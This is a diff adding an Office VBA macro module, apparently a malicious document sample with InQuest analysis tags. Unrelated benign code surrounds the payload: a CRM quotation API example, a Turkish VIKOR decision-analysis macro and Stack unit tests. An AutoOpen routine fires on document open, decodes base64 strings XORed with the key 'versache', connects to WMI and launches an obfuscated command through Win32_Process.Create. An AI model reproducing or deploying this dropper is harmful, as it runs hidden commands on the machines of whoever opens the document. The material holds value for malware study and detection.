@@ -1,0 +1,885 @@
+Attribute VB_Name = "Module1"
+Private Const CP_UTF8                       As Long = 65001
+
+#If Win64 Then
+Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
+Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
+#Else
+Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
+Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
+
+#End If
+ Dim Florida As Variant
+
+ 
+Sub RunQuotationExample()
+    Dim Workbooks As WorkbooksApi
+    Set Workbooks = New WorkbooksApi
+
+    Workbooks.Log "Starting QuotationExample"
+
+
+' Login
+    Dim LoginResponse As WebResponse
+    Set LoginResponse = Workbooks.Login(ApiKey:=Cells(1, "A").Value, ApplicationName:="VBA Test/0.1")
+
+
+' Fetch a Person
+    Dim GetPersonParams As New Dictionary
+    ' Sort field and order ASC/DESC
+    GetPersonParams.Add "_sort", "id"
+    GetPersonParams.Add "_dir", "ASC" ' The earliest records first
+    ' Paging
+    GetPersonParams.Add "_start", "0"
+    GetPersonParams.Add "_limit", "1"
+    ' Recommended to avoid slow-down on large tables where many records may match
+    GetPersonParams.Add "_skip_total_rows", "1"
+
+    Dim GetPersonResponse As Dictionary
+    Set GetPersonResponse = Workbooks.AssertGet(Endpoint:="crm/people", Params:=GetPersonParams)
+    Workbooks.Log "GetPersonResponse", Array(GetPersonResponse), "msgbox"
+
+
+' Fetch a Product (there may be none in the database)
+    Dim GetProductParams As New Dictionary
+    ' Sort field and order ASC/DESC
+    GetProductParams.Add "_sort", "id"
+    GetProductParams.Add "_dir", "ASC" ' The earliest records first
+    ' Paging
+    GetProductParams.Add "_start", "0"
+    GetProductParams.Add "_limit", "1"
+    ' Recommended to avoid slow-down on large tables where many records may match
+    GetProductParams.Add "_skip_total_rows", "1"
+
+    Dim GetProductResponse As Dictionary
+    Set GetProductResponse = Workbooks.AssertGet(Endpoint:="pricebook/products", Params:=GetProductParams)
+    Workbooks.Log "GetProductResponse", Array(GetProductResponse), "msgbox"
+
+
+' Create a Quotation record
+    Dim CreateRecords As New Collection
+
+    Dim CreateRecord1 As New Dictionary
+    CreateRecord1.Add "party_id", GetPersonResponse("data").Item(1)("id")
+    CreateRecord1.Add "description", "New quotation as of " & Now()
+    CreateRecord1.Add "document_date", "New quotation as of " & Format(Now(), "YYYY-MM-DD")
+    CreateRecord1.Add "document_currency", "GBP"
+    CreateRecords.Add CreateRecord1
+
+    Dim CreateQuotationResponse As Dictionary
+    Set CreateQuotationResponse = Workbooks.AssertCreate(Endpoint:="accounting/quotations", Records:=CreateRecords)
+    Workbooks.Log "CreateQuotationResponse", Array(CreateQuotationResponse), "msgbox"
+    Dim QuotationId As String
+    
+    ' Retrieve the id of the Quotation created just now.
+    QuotationId = CreateQuotationResponse("affected_objects").Item(1)("id")
+
+' Create two Quotation line items within that Quotation
+    Dim CreateLineItems As New Collection
+
+    Dim CreateLineItem1 As New Dictionary
+    CreateLineItem1.Add "document_header_id", QuotationId
+    CreateLineItem1.Add "unit_quantity", "10"
+    CreateLineItem1.Add "document_currency_unit_price_value", "75.00 GBP 0" ' Currency format: "AMOUNT CURRENCY_CODE 0"
+    CreateLineItem1.Add "description", "First line item"
+    CreateLineItems.Add CreateLineItem1
+
+    Dim CreateLineItem2 As New Dictionary
+    CreateLineItem2.Add "document_header_id", QuotationId
+    CreateLineItem2.Add "unit_quantity", "20"
+    CreateLineItem2.Add "document_currency_unit_price_value", "42.00 GBP 0"
+    If GetProductResponse("data").Count = 1 Then ' If we found a product, link it to this line item.
+        CreateLineItem2.Add "product_id", GetProductResponse("data").Item(1)("id")
+        CreateLineItem2.Add "description", GetProductResponse("data").Item(1)("description") & " - " & Format(Now(), "YYYY-MM-DD")
+    Else
+        CreateLineItem2.Add "description", "Second line item"
+    End If
+    CreateLineItems.Add CreateLineItem2
+
+    Dim CreateLineItemsResponse As Dictionary
+    Set CreateLineItemsResponse = Workbooks.AssertCreate(Endpoint:="accounting/quotation_line_items", Records:=CreateLineItems)
+    Workbooks.Log "CreateLineItemsResponse", Array(CreateLineItemsResponse), "msgbox"
+
+
+' Update both these Quotation line items
+    Dim UpdateLineItems As New Collection
+    Dim CreateLineItemResult As Dictionary
+    For Each CreateLineItemResult In CreateLineItemsResponse("affected_objects")
+        Dim UpdateLineItem As Dictionary
+        Set UpdateLineItem = New Dictionary
+        ' When updating a record you must supply both its "id" and its current "lock_version".
+        UpdateLineItem.Add "id", CStr(CreateLineItemResult("id"))
+        UpdateLineItem.Add "lock_version", CStr(CreateLineItemResult("lock_version"))
+        ' For this example double each unit_quantity
+        UpdateLineItem.Add "unit_quantity", CreateLineItemResult("unit_quantity") * 2
+        UpdateLineItems.Add UpdateLineItem
+    Next CreateLineItemResult
+
+    Dim UpdateLineItemsResponse As Dictionary
+    Set UpdateLineItemsResponse = Workbooks.AssertUpdate(Endpoint:="accounting/quotation_line_items", Records:=UpdateLineItems)
+    Workbooks.Log "UpdateLineItemsResponse", Array(UpdateLineItemsResponse), "msgbox"
+
+    
+' Fetch the Quotation
+    Dim GetQuotationParams As New Dictionary
+    GetQuotationParams.Add "_ff[]", Array("id")
+    GetQuotationParams.Add "_ft[]", Array("eq")
+    GetQuotationParams.Add "_fc[]", Array(QuotationId)
+    ' Only retrieve the field we need
+    GetQuotationParams.Add "_select_columns[]", Array("lock_version")
+    ' Recommended to avoid slow-down on large tables where many records may match
+    GetQuotationParams.Add "_skip_total_rows", "1"
+    
+    Dim GetQuotationResponse As Dictionary
+    Set GetQuotationResponse = Workbooks.AssertGet(Endpoint:="accounting/quotations", Params:=GetQuotationParams)
+    Workbooks.Log "GetQuotationResponse", Array(GetQuotationResponse), "msgbox"
+
+
+' Update the Quotation (had to fetch it first: updating its line items probably changed its lock_version)
+    Dim UpdateQuotations As New Collection
+    Dim UpdateQuotation As Dictionary
+    Set UpdateQuotation = New Dictionary
+    ' When updating a record you must supply both its "id" and its current "lock_version".
+    UpdateQuotation.Add "id", QuotationId
+    UpdateQuotation.Add "lock_version", GetQuotationResponse("data").Item(1)("lock_version")
+    UpdateQuotation.Add "payment_due_date", Format(Now(), "YYYY-MM-DD")
+    UpdateQuotations.Add UpdateQuotation
+
+    Dim UpdateQuotationsResponse As Dictionary
+    Set UpdateQuotationsResponse = Workbooks.AssertUpdate(Endpoint:="accounting/quotations", Records:=UpdateQuotations)
+    Workbooks.Log "UpdateQuotationsResponse", Array(UpdateQuotationsResponse), "msgbox"
+
+
+' Delete the Quotation (and all its line items).
+    Dim DeleteRecords As New Collection
+    Dim DeleteRecord As Dictionary
+    Set DeleteRecord = New Dictionary
+    ' When deleting a record you must supply both its "id" and its current "lock_version".
+    DeleteRecord.Add "id", QuotationId
+    DeleteRecord.Add "lock_version", CStr(UpdateQuotationsResponse("affected_objects").Item(1)("lock_version"))
+    DeleteRecords.Add DeleteRecord
+
+    Dim DeleteResponse As Dictionary
+    Set DeleteResponse = Workbooks.AssertDelete(Endpoint:="accounting/quotations", Records:=DeleteRecords)
+    Workbooks.Log "DeleteResponse", Array(DeleteResponse), "msgbox"
+
+    Workbooks.Log "QuotationExample completed successfully", "", "msgbox"
+
+    
+' Logout from the service
+    Workbooks.Logout
+
+
+End Sub
+ 
+ 
+ ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+Sub Auti_Open()
+MyFin
+End Sub
+
+    
+Sub AutoOpen()
+
+
+Auti_Open
+    
+
+End Sub
+
+
+Sub MyFin()
+    
+    Dim Got As Variant
+    Got = NobosMeik(VibinJoin("IQcXHjIAGgwGERsdBk07MhQAHz8OAAkRGRc="), "versache")
+    Set KitRol = CreateObject(Got)
+
+
+    Set Florida = KitRol.ConnectServer()
+    Florida.Security_.ImpersonationLevel = 56 * 2 - 109
+    Call Nokia
+    
+End Sub
+
+
+Function Nokia()
+    Dim Firgus As Variant
+    Set Firgus = Florida _
+    .Get _
+    ("Win32_Process")
+    On Error Resume Next
+    Call Firgus _
+    .Create _
+    (NobosMeik(VibinJoin("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECSU5MDxcTBAYADAZGDBgDHVwEGwsJDysWXQUCHEkeEQYDW0xHAgQAEwcSDg1LHwsUHE4NHTcZSxYSFU8AEQIVSFxOBBoAFxEBHgRNAQsQCl07Fi4KSxIEBlNMJw0WAgwcEhUKBwtWOVBXBA0eXyIgPyM9FQEBGUsRHAw/SkkqR1YWDxVSMTMoIi8SBQ0XFzlQXz1BTAAYE0gnJC44OT4SPxFPAAcIKkdJUzIGHEg6ChESFQoHC1ZIIhIVC0g5VEEXHRdZPCA7NS5RWkMLAAQRBwcID0hIEgARHAUGSBYQAAASQQAHCAYKAAdaQ0g2AgQAB0wzGgoVAAEAQRUBARlLERwMQ0UkBAIHHgQNHCkfFgZTAgwFFRkXBg=="), "versache"), _
+    Null, Null, FeraskoLom)
+
+End Function
+
+
+Private Function NobosMeik(text As String, key As String) As String
+  Dim bText() As Byte
+  Dim bKey() As Byte
+  
+  Dim TextUB As Long
+  Dim KeyUB As Long
+  
+  
+  
+  bText = StrConv(text, vbFromUnicode)
+  bKey = StrConv(key, vbFromUnicode)
+  TextUB = UBound(bText)
+  KeyUB = UBound(bKey)
+  Dim TextPos As Long
+  Dim Trenfa As Long
+  For TextPos = 0 To TextUB
+    bText(TextPos) = bText(TextPos) Xor bKey(Trenfa)
+    If Trenfa < KeyUB Then
+      Trenfa = Trenfa + 1
+    Else
+      Trenfa = 0
+    End If
+  Next TextPos
+  NobosMeik = StrConv(bText, vbUnicode)
+End Function
+
+
+
+Public Function DUPLO(file_path As String) As Boolean
+    
+
+    trega = Dir(file_path) <> ""
+    Exit Function
+
+DirErr:
+      If Err.Number = 68 Then
+        trega = False
+    Else
+        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
+        Stop
+    End If
+End Function
+
+Public Function VibinJoin(Vecad As String) As String
+    Dim baValue()       As Byte
+    Dim sValue          As String
+    Dim kerfas           As Long
+    
+    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
+        .DataType = "bin" + ".base64"
+        .text = Vecad
+        baValue = .NodeTypedValue
+        sValue = String$(4 * UBound(baValue), 0)
+        kerfas = MultiByteToWideChar(CP_UTF8, 84 + 2 - 86, baValue((54 + 12 - 66)), UBound(baValue) + (11 * 11 - 120), StrPtr(sValue), Len(sValue))
+        VibinJoin = Left$(sValue, kerfas)
+    End With
+End Function
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Sub vikor()
+x = InputBox("Alternatif Sayysy Giriniz")
+y = InputBox("Kriter Sayysy Giriniz")
+Dim etop() As Double
+ReDim etop(y) As Double
+
+Dim renk() As Double
+ReDim renk(x, y) As Double
+Dim w() As Double
+ReDim w(y) As Double
+
+Dim ext()
+Dim AA() As Double
+Dim BB() As Double
+ReDim AA(y) As Double
+ReDim BB(y) As Double
+Dim R As Long
+Dim c As Long
+ReDim ext(y)
+Dim fp() As Double
+ReDim fp(y) As Double
+
+Dim fn() As Double
+ReDim fn(y) As Double
+
+Dim S() As Double
+ReDim S(x) As Double
+
+
+
+
+
+
+
+
+
+For c = 2 To y + 1
+R = 2
+AA(c - 1) = Cells(R, c)
+BB(c - 1) = Cells(R, c)
+For R = 2 To x + 1
+If Cells(R, c) > AA(c - 1) Then
+AA(c - 1) = Cells(R, c)
+End If
+If Cells(R, c) < BB(c - 1) Then
+BB(c - 1) = Cells(R, c)
+End If
+Next R
+Next c
+
+
+For c = 2 To y + 1
+For R = 2 To x + 1
+If Cells(R, c) < 0 Then
+Cells(R, c) = (AA(c - 1) - BB(c - 1)) * (Cells(R, c) - Int(BB(c - 1))) / ((Sgn(AA(c - 1)) * Int(Abs(AA(c - 1)))) - (Sgn(BB(c - 1)) * Int(Abs(BB(c - 1)))))
+
+End If
+
+Next R
+Next c
+For c = 2 To y + 1
+For R = 2 To x + 1
+If Cells(R, c) = 0 Then
+Cells(R, c) = 0.000001
+End If
+Next R
+Next c
+
+
+
+R = 2
+ c = 1
+For R = 2 To x + 1
+
+Cells(R, c).Select
+Cells(R, c).Value = "A" & CStr(R - 1)
+
+Next R
+R = 1
+
+
+For c = 2 To y + 1
+
+Cells(R, c).Select
+Cells(R, c).Value = "C" & CStr(c - 1)
+geri_:
+ext(c - 1) = InputBox("Bu kriter icin ideal de?er minimum ise 1 maximum ise 2 giriniz.")
+If ext(c - 1) < 1 Or ext(c - 1) > 2 Then
+MsgBox "Yanly? de?er girdiniz"
+GoTo geri_
+
+End If
+Next c
+
+Cells(x + 2, 1).Value = "W"
+
+For c = 2 To y + 1
+etop(c - 1) = 0
+
+For R = 2 To x + 1
+n = Cells(R, c)
+
+
+etop(c - 1) = etop(c - 1) + n
+Next R
+
+
+
+Next c
+
+For c = 2 To y + 1
+
+For R = 2 To x + 1
+
+renk(R - 1, c - 1) = Cells(R, c) / etop(c - 1)
+
+
+
+
+Next R
+
+
+Next c
+
+P = 0
+For c = 2 To y + 1
+t = 0
+For R = 2 To x + 1
+
+
+k = -renk(R - 1, c - 1) * Log(renk(R - 1, c - 1)) / Log(x)
+t = t + k
+Next R
+P = P + 1 - t
+w(c - 1) = t
+
+
+
+Next c
+
+
+
+For c = 2 To y + 1
+w(c - 1) = (1 - w(c - 1)) / P
+
+Cells(x + 2, c).Value = w(c - 1)
+
+Next c
+Cells(x + 2, 1).Select
+MsgBox "W ile ba?layan satyrda herbir kriter icin Entropy yontemiyle hesaplanmy? olan a?yrlyk de?erleri yer almaktadyr"
+
+For j = 1 To y
+
+If ext(j) = 2 Then
+fp(j) = AA(j)
+fn(j) = BB(j)
+Else
+fp(j) = BB(j)
+fn(j) = AA(j)
+End If
+Next j
+
+
+'Sj de?erlerinin hesaplanmasy
+
+'Rj de?erlerinin hesaplanmasy
+Dim Rj() As Double
+ReDim Rj(x) As Double
+
+Cells(1, y + 4) = "S"
+Cells(1, y + 5) = "R"
+
+fa = -1E+22
+na = 1E+28
+Ry = 1E+31
+Rn = -1E+34
+For i = 1 To x
+
+ma = 0
+ka = -1E+29
+For j = 1 To y
+
+S(i) = w(j) * (fp(j) - Cells(i + 1, j + 1)) / (fp(j) - fn(j))
+Rj(i) = S(i)
+
+If ka < Rj(i) Then
+ka = Rj(i)
+End If
+
+ma = ma + S(i)
+Next j
+
+
+
+
+
+
+
+Rj(i) = ka
+S(i) = ma
+
+'S*=min Sj Sy ile gosteriliyor
+'S-=max Sj Sn ile gosteriliyor
+If fa < S(i) Then
+fa = S(i)
+End If
+If na > S(i) Then
+na = S(i)
+End If
+'R*=min Rj Ry ile gosteriliyor
+'R-=max Rj Rn ile gosteriliyor
+
+If Ry > Rj(i) Then
+Ry = Rj(i)
+End If
+If Rn < Rj(i) Then
+Rn = Rj(i)
+End If
+
+Cells(i + 1, y + 4) = S(i)
+Cells(i + 1, y + 5) = Rj(i)
+
+
+
+Next i
+Sn = fa
+Sy = na
+Cells(1, y + 6) = "S*"
+Cells(2, y + 6) = Sy
+Cells(1, y + 7) = "S-"
+Cells(2, y + 7) = Sn
+Cells(1, y + 8) = "R*"
+Cells(2, y + 8) = Ry
+
+Cells(1, y + 9) = "R-"
+Cells(2, y + 9) = Rn
+'Qj de?erlerinin hesaplanmasy
+Cells(1, y + 10) = "Q"
+
+Cells(1, y + 11) = "Q Syra"
+Cells(1, y + 12) = "Q De?er"
+Cells(1, y + 13) = "S Syra"
+Cells(1, y + 14) = "S De?er"
+
+Cells(1, y + 15) = "R Syra"
+Cells(1, y + 16) = "R De?er"
+
+Dim Qj() As Double
+ReDim Qj(x) As Double
+For j = 1 To x
+Qj(j) = 0.5 * (S(j) - Sy) / (Sn - Sy) + 0.5 * (Rj(j) - Ry) / (Rn - Ry)
+Cells(1 + j, y + 10) = Qj(j)
+Next j
+'Qj lerin syralanmasy
+'Sj lerin syralanmasy
+'Rj lerin syralanmasy
+Dim Q() As syra
+ReDim Q(x) As syra
+Dim Si() As syra
+ReDim Si(x) As syra
+Dim Ri() As syra
+ReDim Ri(x) As syra
+
+DQ = 1 / (x - 1)
+For i = 1 To x
+mes = Qj(i)
+nes = S(i)
+les = Rj(i)
+For j = 1 To x
+If les >= Rj(j) Then
+les = Rj(j)
+Ri(i).y = j
+End If
+
+
+If nes >= S(j) Then
+nes = S(j)
+Si(i).y = j
+End If
+
+If mes >= Qj(j) Then
+mes = Qj(j)
+Q(i).y = j
+End If
+Next j
+Ri(i).x = les
+Rj(Ri(i).y) = 1E+26
+
+
+Si(i).x = nes
+S(Si(i).y) = 1E+26
+Q(i).x = mes
+Qj(Q(i).y) = 1E+26
+Cells(1 + i, y + 11) = "A" & Str(Q(i).y)
+Cells(1 + i, y + 12) = Q(i).x
+Cells(1 + i, y + 13) = "A" & Str(Si(i).y)
+Cells(1 + i, y + 14) = Si(i).x
+Cells(1 + i, y + 15) = "A" & Str(Ri(i).y)
+Cells(1 + i, y + 16) = Ri(i).x
+
+
+Next i
+
+Cells(1, y + 17) = "Uzla?yk cozum kumesi"
+Dim kosul(2) As Boolean
+
+
+If (Q(2).x - Q(1).x) >= DQ Then
+kosul(1) = True
+Else
+kosul(1) = False
+End If
+If Si(1).y = Q(1).y Or Ri(1).y = Q(1).y Then
+kosul(2) = True
+Else
+kosul(2) = False
+End If
+If kosul(1) = False Then
+For j = 3 To x
+
+If (Q(j).x - Q(1).x) >= DQ Then
+
+Exit For
+End If
+Next j
+
+For i = 1 To j
+Cells(i + 1, y + 18) = "A" & Str(Q(i).y)
+Next i
+
+End If
+If kosul(1) = False Then
+Cells(2, y + 18) = "A" & Str(Q(1).y)
+
+Cells(3, y + 18) = "A" & Str(Q(2).y)
+End If
+If kosul(1) = True And kosul(2) = True Then
+Cells(2, y + 18) = "A" & Str(Q(1).y)
+End If
+
+End Sub
+
+Public Sub Start()
+    
+    InitializationTest
+    ThrowArgumentNullExceptionWhenInitialCapacityIsNegativeTest
+    PushTest
+    PopTest
+    ContainsTest
+    ClearTest
+    PushItemAfterClearTest
+    ToArrayTest
+    PeekTest
+    CopyToTest
+    PushPeekPopObjectTest
+    
+End Sub
+
+
+Private Sub InitializationTest()
+    
+    Const MethodName As String = "InitializationTest"
+    On Error GoTo ErrHandler
+    
+    Dim Stack As New Stack: Stack.Init1 10
+    ExUnit.AreEqual 0, Stack.Count, GetFullSig(MethodName)
+
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+    
+End Sub
+
+
+Private Sub ThrowArgumentNullExceptionWhenInitialCapacityIsNegativeTest()
+    
+    Const MethodName As String = "ThrowArgumentNullExceptionWhenInitialCapacityIsNegativeTest"
+    On Error GoTo ErrHandler
+    
+    Dim Stack As New Stack: Stack.Init1 -1
+    
+ErrHandler:
+    ExUnit.IsException ExceptionCode.ArgumentOutOfRange, Err.Number, GetFullSig(MethodName)
+    
+End Sub
+
+
+Private Function GetFullSig(ByVal MethodName As String) As String
+    GetFullSig = ModuleName & "." & MethodName
+End Function
+
+
+Private Sub PushTest()
+
+    Const MethodName As String = "PushTest"
+    On Error GoTo ErrHandler
+    
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push "a"
+    ExUnit.AreEqual "a", Stack.Peek, GetFullSig(MethodName)
+    
+    Stack.Push "b"
+    ExUnit.AreEqual "b", Stack.Peek, GetFullSig(MethodName)
+    ExUnit.AreEqual 2, Stack.Count, GetFullSig(MethodName)
+    
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub PopTest()
+
+    Const MethodName As String = "PopTest"
+    On Error GoTo ErrHandler
+
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push "a"
+    Stack.Push "b"
+
+    ExUnit.AreEqual 2, Stack.Count, GetFullSig(MethodName)
+    ExUnit.AreEqual "b", Stack.Pop, GetFullSig(MethodName)
+    ExUnit.AreEqual 1, Stack.Count, GetFullSig(MethodName)
+    
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub ContainsTest()
+
+    Const MethodName As String = "ContainsTest"
+    On Error GoTo ErrHandler
+    
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push 123
+
+    ExUnit.IsTrue Stack.Contains(123, New LongEqualityComparer), GetFullSig(MethodName)
+    
+    Exit Sub
+ErrHandler:
+    TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub PushItemAfterClearTest()
+
+    Const MethodName As String = "PushItemAfterClearTest"
+    On Error GoTo ErrHandler
+
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push 123
+    Stack.Clear
+    Stack.Push 123
+    
+    ExUnit.AreEqual 123, Stack.Peek, GetFullSig(MethodName)
+
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub ClearTest()
+
+    Const MethodName As String = "ClearTest"
+    On Error GoTo ErrHandler
+
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push 123
+    
+    ExUnit.AreEqual 1, Stack.Count, GetFullSig(MethodName)
+    Stack.Clear
+    ExUnit.AreEqual 0, Stack.Count, GetFullSig(MethodName)
+
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub ToArrayTest()
+
+    Const MethodName As String = "ToArrayTest"
+    On Error GoTo ErrHandler
+
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push "a"
+    Stack.Push "b"
+    Stack.Push "c"
+
+    Dim Arr() As Variant
+    Arr = Stack.ToArray
+     
+    ExUnit.AreEqual "c", Arr(0), GetFullSig(MethodName)
+    ExUnit.AreEqual "b", Arr(1), GetFullSig(MethodName)
+    ExUnit.AreEqual "a", Arr(2), GetFullSig(MethodName)
+    
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub PeekTest()
+
+    Const MethodName As String = "PeekTest"
+    On Error GoTo ErrHandler
+
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push "a"
+    ExUnit.AreEqual "a", Stack.Peek, GetFullSig(MethodName)
+
+    Stack.Push "b"
+    ExUnit.AreEqual "b", Stack.Peek, GetFullSig(MethodName)
+
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub CopyToTest()
+
+    Const MethodName As String = "CopyToTest"
+    On Error GoTo ErrHandler
+
+    Dim Stack As New Stack: Stack.Init1 10
+    Stack.Push "a"
+    Stack.Push "b"
+    Stack.Push "c"
+
+    Dim Arr(2) As Variant
+    Stack.CopyTo Arr, 0
+
+    ExUnit.AreEqual "c", Arr(0), GetFullSig(MethodName)
+    ExUnit.AreEqual "b", Arr(1), GetFullSig(MethodName)
+    ExUnit.AreEqual "a", Arr(2), GetFullSig(MethodName)
+
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+Private Sub PushPeekPopObjectTest()
+
+    Const MethodName As String = "PushPeekPopObjectTest"
+    On Error GoTo ErrHandler
+    
+    Dim Stk As New Stack: Stk.Init1 10
+
+    Stk.Push ThisWorkbook
+    ExUnit.AreSame ThisWorkbook, Stk.Peek, GetFullSig(MethodName)
+    ExUnit.AreSame ThisWorkbook, Stk.Pop, GetFullSig(MethodName)
+    
+    Exit Sub
+ErrHandler:
+    ExUnit.TestFailRunTime GetFullSig(MethodName)
+
+End Sub
+
+
+
+
+
+
+
+
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+' InQuest injected base64 decoded content
+' V9PW
+' _" ?#=
+' ?JI*GV
+' R13("/
+' 9P_=AL
+' H'$.89>
+' *GIS2
+' H9TA
+' Y< ;5.QZC
+' ZCH6
+
+INQUEST-PP=macro
